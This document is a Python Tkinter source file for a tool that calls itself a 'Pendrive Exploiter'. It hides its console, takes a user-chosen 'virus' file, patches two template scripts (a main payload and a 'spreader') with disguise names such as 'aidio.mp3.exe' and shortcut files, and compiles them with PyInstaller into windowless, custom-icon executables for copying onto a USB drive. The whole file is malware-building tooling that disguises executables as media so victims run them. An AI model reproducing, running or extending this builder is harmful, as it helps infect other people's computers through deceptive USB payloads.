#donate money 
#coded by sachin BBSAD
#import time

import threading
import ctypes


ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
import subprocess

import os
from tkinter import *
from tkinter.filedialog import askopenfilename
#from threading import Thread

global run

root = Tk()

def browse():
	file1 = askopenfilename()
	entry1.insert(END, file1)
	

def icon():
	file2 = askopenfilename()
	entry4.insert(END,file2)
def icon1():
	fi = askopenfilename()	
	entry6.insert(END,fi)
def target():
	fe = askopenfilename()
	entry2.insert(END,fe)

def generate():
#	run = True
	output.delete(0.0, END)
	output.insert(END , "Generating ..... ")
	root.after(1000,process)




def process():
#	run = False
	
	filess1 = entry1.get()
	filess2 = entry2.get()
	filess3 = entry3.get()
	filess4 = entry4.get()
	filess5 = entry5.get()	
	filess6 = entry6.get()

	if filess1 == "": 
		output.delete(0.0, END)
		output.insert(END, "\nPlease select Virus file ..\n")
	elif not os.path.exists(filess1):
		output.delete(0.0, END)
		output.insert(END, "\n Virus file path incorrect ..\n")
	elif filess2 == "": 
		output.delete(0.0, END)
		output.insert(END, "\nPlease Enter Taget path ..\n")
	elif filess3 == "":
		output.delete(0.0, END)
		output.insert(END, "\nPlease fill Rename main1 ..\n")
	elif filess4 == "":
		output.delete(0.0, END)
		output.insert(END, "\nPlease Select Icon ..\n")
	elif not os.path.exists(filess4):
		output.delete(0.0, END)
		output.insert(END, "\nIcon path incorrect ..\n")
	elif filess5 == "":
		output.delete(0.0, END)
		output.insert(END, "\nPlease fill Rename main2 ..\n")
	else:
		
		thred = threading.Thread(target=mainf)
		thred.start()


def mainf():	
	
		sac1 = entry1.get()
		sac2 = sac1.split("/")
		sac3 = len(sac2)
		sac3 = sac3 - 1
		sac4 = sac2[sac3]

		fil1 = open("12camera.py" , "r")
		fil2 = fil1.read()
		fil1.close()

		fil3 = fil2.replace("aidio.mp3.exe",sac4)
		fil4 = sac4.replace(".exe","_")
		fil5 = fil4+".lnk"
		fil6 = fil3.replace("aidio.mp3_short.lnk",fil5)

##### main 2

		ajay = entry5.get()
		fil7 = fil6.replace("test.exe",ajay)
	
		migore1 = ajay.replace(".exe","_")
		migore2 = migore1+".lnk"

		fil8 = fil7.replace("test_short.lnk",migore2)

##### Target path
	
		bairamma = entry2.get()
		boothappa = bairamma.replace("/" ,"\\\\")
		kamalakshi = bairamma.replace("/","\\\\")

		fil9 = fil8.replace("C:\\\songs",boothappa)	
		fil10 = fil9.replace("C:\\songs",kamalakshi)

		ravindra = entry3.get()
	
		fil11 = fil10.replace("12camera.exe" , ravindra)
		fil12 = open("1.py","w")
		fil12.write(fil11)
		fil12.close()

###### spreader file 
	
		mmc1 = open("test.py","r")
		mmc2 = mmc1.read()
		mmc1.close()

		mmc3 = mmc2.replace("aidio.mp3.exe", sac4)
		mmc4 = mmc3.replace("aidio.mp3_short.lnk",fil5)
		mmc5 = mmc4.replace("test.exe" , ajay)
		mmc6 = mmc5.replace("test_short.lnk", migore2)
		mmc7 = mmc6.replace("12camera.exe",ravindra)
		mmc8 = mmc7.replace("C:\\\songs", kamalakshi)

		mmc9 = open("2.py","w")
		mmc9.write(mmc8)
		mmc9.close()
	
		shani = entry4.get()
		hanuma = entry6.get()
	
		
	
	
		pwd1 = os.getcwd()
		os.system("rmdir /s/q dist")
	
		os.system(pwd1+"\\python\\Scripts\\pyinstaller.exe --icon="+shani+" -F --noconsole 1.py")
		#os.system(pwd1+"\\python\\Scripts\\pyinstaller.exe --onefile 1.py")
		os.system(pwd1+"\\python\\Scripts\\pyinstaller.exe --icon="+hanuma+" -F --noconsole 2.py ")
		#path1 = pwd1+"\\python\\Scripts\\pyinstaller.exe"
		#path2 = "-i"+shani+" --onefile 1.py"
		#path3 = pwd1+"\\python\\Scripts\\pyinstaller.exe"
		#path4 = "-i replace.ico --onefile 2.py"
		#subprocess.Popen([path1 , path2], stdout=subprocess.PIPE)

		#subprocess.Popen([path3 , path4], stdout=subprocess.PIPE)
	
		os.remove("1.spec")
		os.remove("2.spec")
		os.remove("1.py")
		os.remove("2.py")

		os.system("move "+pwd1+"\\dist\\1.exe "+pwd1+"\\dist\\"+ravindra)
		os.system("move "+pwd1+"\\dist\\2.exe "+pwd1+"\\dist\\"+ajay)

		final = sac1.replace("/" , "\\")
		os.system("xcopy "+final+" "+pwd1+"\\dist")

		os.system("rmdir /s/q build")
		output.delete(0.0, END)
		output.insert(END, "finished .......\n")
		output.insert(END, "\n")
		output.insert(END, "Check in dist folder copy all files into pendrive ...")
		#t = Thread(target = move_forward, args = ())
		#t.start()
		
	




########################################################
	
root.title("pendrive exploit [ V 1.0 ]")

root.geometry("500x400")

root.resizable(width="False", height="False")

welcome = Label(root, text="[ BBSAD ] Pendrive Exploiter V 1.0 " ,
		fg="green",
		bg="black",
		width="30",
		height="2")
welcome.pack()
########################################################
name1 = Label(root, text="Select virus   : " ,
	     width=20,
	     fg="black")
name1.place(x=30,y=50)

name2 = Label(root, text="Target path  : " ,
	     width=20,
	     fg="black")
name2.place(x=30,y=80)

entry1 = Entry(root, width=30,
	       bg="white",
	       fg="black")
entry1.place(x=170,y=50)

entry2 = Entry(root, width=30,
	       bg="white",
	       fg="black")
entry2.place(x=170,y=80)


button1 = Button(root, text="Browse",
		 command=browse)
button1.place(x=370,y=45)

########################################################
name3 = Label(root, text="     Rename main1 : " ,
	     width=20,
	     fg="black")
name3.place(x=30,y=110)

name4 = Label(root, text="Icon : ",
	      width=20,
	      fg="black")
name4.place(x=190,y=110)

name5 = Label(root, text="     Rename main2 : ",
	      width=20,
	      fg="black")
name5.place(x=30,y=140)

name6 = Label(root, text="Icon : ",
		width=20,
		fg="black")
name6.place(x=190,y=140)

entry3 = Entry(root, width=10,
	       bg="white",
	       fg="black")
entry3.place(x=170,y=110)

entry4 = Entry(root, width=10)
entry4.place(x=290,y=110)

entry5 = Entry(root, width=10)
entry5.place(x=170,y=140)

entry6 = Entry(root, width=10)
entry6.place(x=290,y=140)

button2 = Button(root, text="Browse",
		 command=icon)
button2.place(x=370,y=105)

button4 = Button(root, text="Browse",
		 command=icon1)
button4.place(x=370,y=137)

#button5 = Button(root,text="Browse",
#		 command=target)
#button5.place(x=370,y=75)

button3 = Button(root, text="GENERATE",
                 width=10,
		 height=2,
		 fg="white",
		 bg="red",
		 command=generate)
button3.place(x=210,y=190)

button3.bind('<ButtonPress-1>',generate)
#button3.bind('<ButtonRelease-1>',some)


oo = Label(root, text="Output    ",bg="light blue",fg="white",
	   width="70",
	   anchor=N)
oo.place(x=3,y=280)

output = Text(root, width=61 ,height=10, wrap=WORD, background="black", fg="green")
output.place(x=3,y=300)






#name = Label(root, text="Select file "
root.mainloop()